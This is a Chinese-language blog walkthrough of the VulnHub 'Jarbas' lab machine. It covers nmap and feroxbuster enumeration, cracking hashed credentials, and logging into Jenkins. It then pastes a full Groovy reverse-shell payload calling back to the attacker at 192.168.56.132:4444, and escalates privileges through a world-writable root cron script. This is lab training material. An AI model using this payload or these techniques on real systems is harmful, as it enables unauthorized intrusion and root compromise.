<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>[vulnhub]  jarbas | Terminal-001 | T3yT3y</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.7.0/styles/default.min.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Brands';
 src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Free';
 src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"><link rel="stylesheet" href="/css/prism-duotone-dark.css" type="text/css">
<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>[vulnhub]  jarbas</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-05-23T16:29:19.558Z" id="date"> 2023-05-24</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-05-23T16:33:09.227Z" id="updated"> 2023-05-24</time></div></span><br><span>Word Count: <div class="control">1.5k</div></span><br><span>Read Time: <div class="control">8 min</div></span></div></div><hr><div id="post-content"><p class='item-img' data-src='/pic/ae7ce8e5e8f21d40b72392efba79fcc024889090.jpg'><img src="/pic/ae7ce8e5e8f21d40b72392efba79fcc024889090.jpg" alt="ae7ce8e5e8f21d40b72392efba79fcc024889090"></p>
<span id="more"></span>

<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h3><ol>
<li><p><code>nmap -sn</code>主机发现</p>
<pre class="line-numbers language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
└─$ nmap -sn 192.168.56.0/24
map 7.93 <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2023-04-15 04:27 EDT
Nmap scan report <span class="token keyword">for</span> 192.168.56.2
Host is up <span class="token punctuation">(</span>0.00062s latency<span class="token punctuation">)</span>.
Nmap scan report <span class="token keyword">for</span> 192.168.56.132
Host is up <span class="token punctuation">(</span>0.0013s latency<span class="token punctuation">)</span>.
Nmap scan report <span class="token keyword">for</span> 192.168.56.134
Host is up <span class="token punctuation">(</span>0.0031s latency<span class="token punctuation">)</span>.
Nmap done: 256 IP addresses <span class="token punctuation">(</span>3 hosts up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> 2.57 seconds
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>目标发现：<code>192.168.56.134</code></p>
</li>
<li><p><code>nmap -p- --min-rate=10000</code>端口扫描</p>
<pre class="line-numbers language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
└─$ <span class="token function">sudo</span> nmap -p- --min-rate<span class="token operator">=</span>10000 192.168.56.134
Starting Nmap 7.93 <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2023-04-15 04:30 EDT
Nmap scan report <span class="token keyword">for</span> 192.168.56.134
Host is up <span class="token punctuation">(</span>0.00087s latency<span class="token punctuation">)</span>.
Not shown: 65531 closed tcp ports <span class="token punctuation">(</span>conn-refused<span class="token punctuation">)</span>
PORT     STATE SERVICE
22/tcp   <span class="token function">open</span>  <span class="token function">ssh</span>
80/tcp   <span class="token function">open</span>  http
3306/tcp <span class="token function">open</span>  mysql
8080/tcp <span class="token function">open</span>  http-proxy

Nmap done: 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> 3.42 seconds
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>22，80，3306，8080端口开放。</p>
</li>
<li><p>TCP扫描，服务检测，操作系统识别</p>
<pre class="line-numbers language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
└─$ <span class="token function">sudo</span> nmap -sT -sV -O -p22,80,3306,8080 192.168.56.134
<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> password <span class="token keyword">for</span> kali: 
Starting Nmap 7.93 <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2023-04-15 04:31 EDT
Nmap scan report <span class="token keyword">for</span> 192.168.56.134
Host is up <span class="token punctuation">(</span>0.00062s latency<span class="token punctuation">)</span>.

PORT     STATE SERVICE VERSION
22/tcp   <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH 7.4 <span class="token punctuation">(</span>protocol 2.0<span class="token punctuation">)</span>
80/tcp   <span class="token function">open</span>  http    Apache httpd 2.4.6 <span class="token punctuation">((</span>CentOS<span class="token punctuation">)</span> PHP/5.4.16<span class="token punctuation">)</span>
3306/tcp <span class="token function">open</span>  mysql   MariaDB <span class="token punctuation">(</span>unauthorized<span class="token punctuation">)</span>
8080/tcp <span class="token function">open</span>  http    Jetty 9.4.z-SNAPSHOT
MAC Address: 00:0C:29:D4:0A:9B <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>
Warning: OSScan results may be unreliable because we could not <span class="token function">find</span> at least 1 <span class="token function">open</span> and 1 closed port
Device type: general purpose
Running: Linux 3.X<span class="token operator">|</span>4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token keyword">.</span>
Nmap done: 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> 8.48 seconds
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>看起来80和8080好下手，且8080开放的服务版本也识别出来了：Jetty 9.4.z-SNAPSHOT。</p>
</li>
<li><p>漏洞扫描</p>
<pre class="line-numbers language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
└─$ <span class="token function">sudo</span> nmap --script<span class="token operator">=</span>vuln -p22,80,3306,8080 192.168.56.134
Starting Nmap 7.93 <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2023-04-15 04:36 EDT
Nmap scan report <span class="token keyword">for</span> 192.168.56.134
Host is up <span class="token punctuation">(</span>0.00062s latency<span class="token punctuation">)</span>.

PORT     STATE SERVICE
22/tcp   <span class="token function">open</span>  <span class="token function">ssh</span>
80/tcp   <span class="token function">open</span>  http
<span class="token operator">|</span> http-enum: 
<span class="token operator">|</span>_  /icons/: Potentially interesting folder w/ directory listing
<span class="token operator">|</span>_http-trace: TRACE is enabled
<span class="token operator">|</span>_http-csrf: Couldn<span class="token string">'t find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn'</span>t <span class="token function">find</span> any DOM based XSS.
<span class="token operator">|</span>_http-stored-xss: Couldn't <span class="token function">find</span> any stored XSS vulnerabilities.
3306/tcp <span class="token function">open</span>  mysql
8080/tcp <span class="token function">open</span>  http-proxy
<span class="token operator">|</span> http-enum: 
<span class="token operator">|</span>_  /robots.txt: Robots <span class="token function">file</span>
MAC Address: 00:0C:29:D4:0A:9B <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>

Nmap done: 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> 35.09 seconds
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可以看看8080的robots.txt文件，其他没啥有用信息。</p>
</li>
</ol>
<h4 id="80与8080端口"><a href="#80与8080端口" class="headerlink" title="80与8080端口"></a>80与8080端口</h4><ol>
<li><p>先浏览器访问<code>192.168.56.134</code>以及<code>192.168.56.134:8080</code>。</p>
</li>
<li><p>80端口运行着一个奇奇怪怪的网页，有个登录框，随便尝试登录发现跳转不正常，会失败。点击网页其他的连接地址也会错误跳转。单从网页上没啥有用信息。<img src="/pic/assets/jarbas-80.png" alt="jarbas-80"></p>
</li>
<li><p>看看8080吧家人们。发现是个Jenkins的后台登录页面，网页底部还写了jenkins版本是2.1.13，直接<code>searchsploir</code>没找到有用exp。先放着。同时，8080运行的Jetty版本也有了，一起搜一搜，还是没啥能用的漏洞。</p>
</li>
<li><p>回旋！没啥有用信息，先试试网页目录发现。</p>
</li>
<li><p>直接上<code>feroxbuster</code></p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#### content discovery</span>

``<span class="token variable"><span class="token variable">`</span><span class="token function">bash</span>
┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
└─$ <span class="token function">sudo</span> feroxbuster -u http://192.168.56.134 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s 200,301,302,401 

 ___  ___  __   __     __      __         __   ___
<span class="token operator">|</span>__  <span class="token operator">|</span>__  <span class="token operator">|</span>__<span class="token punctuation">)</span> <span class="token operator">|</span>__<span class="token punctuation">)</span> <span class="token operator">|</span> /  <span class="token variable">`</span></span>    /  \ \_/ <span class="token operator">|</span> <span class="token operator">|</span>  \ <span class="token operator">|</span>__
<span class="token operator">|</span>    <span class="token operator">|</span>___ <span class="token operator">|</span>  \ <span class="token operator">|</span>  \ <span class="token operator">|</span> \__,    \__/ / \ <span class="token operator">|</span> <span class="token operator">|</span>__/ <span class="token operator">|</span>___
by Ben <span class="token string">"epi"</span> Risher 🤓                 ver: 2.9.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.56.134
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 👌  Status Codes          │ <span class="token punctuation">[</span>200, 301, 302, 401<span class="token punctuation">]</span>
 💥  Timeout <span class="token punctuation">(</span>secs<span class="token punctuation">)</span>        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ <span class="token punctuation">[</span>GET<span class="token punctuation">]</span>
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press <span class="token punctuation">[</span>ENTER<span class="token punctuation">]</span> to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      404l     1784w    32906c http://192.168.56.134/
<span class="token punctuation">[</span><span class="token comment" spellcheck="true">####################] - 33s   220546/220546  0s      found:1       errors:0      </span>
<span class="token punctuation">[</span><span class="token comment" spellcheck="true">####################] - 32s   220546/220546  6798/s  http://192.168.56.134/ </span>
```
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>什么也没找到，奇了怪了，事出反常必有妖。在网页点击几个链接，发现使用php写的，尝试指定文件后缀重新发现。</p>
<p><code>-x php,html</code></p>
<pre class="line-numbers language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
└─$ <span class="token function">sudo</span> feroxbuster -u http://192.168.56.134 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html -s 200,301,302,401 

 ___  ___  __   __     __      __         __   ___
<span class="token operator">|</span>__  <span class="token operator">|</span>__  <span class="token operator">|</span>__<span class="token punctuation">)</span> <span class="token operator">|</span>__<span class="token punctuation">)</span> <span class="token operator">|</span> /  `    /  \ \_/ <span class="token operator">|</span> <span class="token operator">|</span>  \ <span class="token operator">|</span>__
<span class="token operator">|</span>    <span class="token operator">|</span>___ <span class="token operator">|</span>  \ <span class="token operator">|</span>  \ <span class="token operator">|</span> \__,    \__/ / \ <span class="token operator">|</span> <span class="token operator">|</span>__/ <span class="token operator">|</span>___
by Ben <span class="token string">"epi"</span> Risher 🤓                 ver: 2.9.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.56.134
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 👌  Status Codes          │ <span class="token punctuation">[</span>200, 301, 302, 401<span class="token punctuation">]</span>
 💥  Timeout <span class="token punctuation">(</span>secs<span class="token punctuation">)</span>        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ <span class="token punctuation">[</span>php, html<span class="token punctuation">]</span>
 🏁  HTTP methods          │ <span class="token punctuation">[</span>GET<span class="token punctuation">]</span>
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press <span class="token punctuation">[</span>ENTER<span class="token punctuation">]</span> to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      404l     1784w    32906c http://192.168.56.134/
200      GET      404l     1784w    32906c http://192.168.56.134/index.html
200      GET       13l       28w      359c http://192.168.56.134/access.html
<span class="token punctuation">[</span><span class="token comment" spellcheck="true">####################] - 1m    661638/661638  0s      found:3       errors:0      </span>
<span class="token punctuation">[</span><span class="token comment" spellcheck="true">####################] - 1m    661638/661638  6456/s  http://192.168.56.134/</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li><p>访问access.html，发现了加密的登录凭证。</p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># http://192.168.56.134/access.html</span>
Creds encrypted <span class="token keyword">in</span> a safe way<span class="token operator">!</span>

tiago:5978a63b4654c73c60fa24f836386d87
trindade:f463f63616cb3f1e81ce46b39f882fd5-----marianna
eder:9b38e2b1e8b12f426b0d208a7ab6cb98-----vipsu

<span class="token comment" spellcheck="true"># hash-indentify 发现最可能是md5加密</span>

<span class="token comment" spellcheck="true"># 使用crackstation解密，发现是LM类型加密</span>
tiago:italia99
trindade:marianna
eder:vipsu
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li><p>另说一句，目录发现8080端口能发现一些文件夹，但是无效信息，没用。</p>
</li>
<li><p>根据以上获得的登录凭证，尝试ssh登录，全都失败，再尝试登录jenkins后台，发现<code>eder:vipsu</code>可以成功进入后台。</p>
</li>
</ol>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><ol>
<li><p>jenkins一眼存在错误配置导致的RCE漏洞。进入<code>/script</code>页面，从<a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#groovy-alternative-1">PayloadAllTheThing</a>上搜一搜groovy script的reverse shell payload。填入框中点击run。</p>
<pre class="line-numbers language-groovy"><code class="language-groovy"><span class="token comment" spellcheck="true">// Groovy script payload</span>
String host<span class="token operator">=</span><span class="token string">"192.168.56.132"</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> port<span class="token operator">=</span><span class="token number">4444</span><span class="token punctuation">;</span>
String cmd<span class="token operator">=</span><span class="token string">"/bin/bash"</span><span class="token punctuation">;</span>
Process p<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ProcessBuilder</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">redirectErrorStream</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Socket s<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Socket</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">;</span>InputStream pi<span class="token operator">=</span>p<span class="token operator">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>pe<span class="token operator">=</span>p<span class="token operator">.</span><span class="token function">getErrorStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> si<span class="token operator">=</span>s<span class="token operator">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>OutputStream po<span class="token operator">=</span>p<span class="token operator">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>so<span class="token operator">=</span>s<span class="token operator">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>s<span class="token operator">.</span><span class="token function">isClosed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span>pi<span class="token operator">.</span><span class="token function">available</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span>so<span class="token operator">.</span><span class="token function">write</span><span class="token punctuation">(</span>pi<span class="token operator">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span>pe<span class="token operator">.</span><span class="token function">available</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span>so<span class="token operator">.</span><span class="token function">write</span><span class="token punctuation">(</span>pe<span class="token operator">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span>si<span class="token operator">.</span><span class="token function">available</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span>po<span class="token operator">.</span><span class="token function">write</span><span class="token punctuation">(</span>si<span class="token operator">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>so<span class="token operator">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>po<span class="token operator">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Thread<span class="token operator">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">try</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>p<span class="token operator">.</span><span class="token function">exitValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span><span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">;</span>p<span class="token operator">.</span><span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>s<span class="token operator">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p class='item-img' data-src='/pic/assets/jenkins-script.png'><img src="/pic/assets/jenkins-script.png" alt="jenkins-script"></p>
</li>
<li><p>成功拿到jenkins的shell。</p>
</li>
</ol>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><ol>
<li><p>遇事不决<code>sudo -l</code>，要密码，歇逼。</p>
</li>
<li><p>看看SUID，<code>find / -type f -perm -04000 -ls 2&gt;/dev/null</code>,没啥有用的。</p>
</li>
<li><p>三板斧之cronjob，看看crontab。</p>
<p class='item-img' data-src='/pic/assets/crontab.png'><img src="/pic/assets/crontab.png" alt="crontab"></p>
<p>发现<code>/etc/script</code>下有个<code>CleaningScript.sh</code>命令脚本，<code>*/5</code>说明其每5分钟运行一次。</p>
<p><code>ls -la</code>发现其权限竟然是777且所有者是root。完美，我们向里面写入我们的reverse shel。</p>
<p class='item-img' data-src='/pic/assets/cronjob-modify.png'><img src="/pic/assets/cronjob-modify.png" alt="cronjob-modify"></p>
</li>
<li><p>在本机使用nc监听，到整数5分钟时。接收到了root shell。</p>
<p class='item-img' data-src='/pic/assets/get-root-shell.png'><img src="/pic/assets/get-root-shell.png" alt="get-root-shell"></p>
</li>
<li><p>看看flag</p>
<p class='item-img' data-src='/pic/assets/flag-cat.png'><img src="/pic/assets/flag-cat.png" alt="flag-cat"></p>
</li>
</ol>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/05/24/LAMPSECURITY%20CTF5_my/">← Next [vulnhub]  LampSec-CTF5</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/05/23/LampSec-CTF7/">[vulnhub]  LampSec-CTF7 Prev →</a></div></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Dr.T3yT3y</a></h1><div id="description"><p>May the flame guide thee</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap%E6%89%AB%E6%8F%8F"><span class="toc-number">1.1.</span> <span class="toc-text">nmap扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#80%E4%B8%8E8080%E7%AB%AF%E5%8F%A3"><span class="toc-number">1.1.1.</span> <span class="toc-text">80与8080端口</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.3.</span> <span class="toc-text">提权</span></a></li></ol></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {code.findCode();
document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>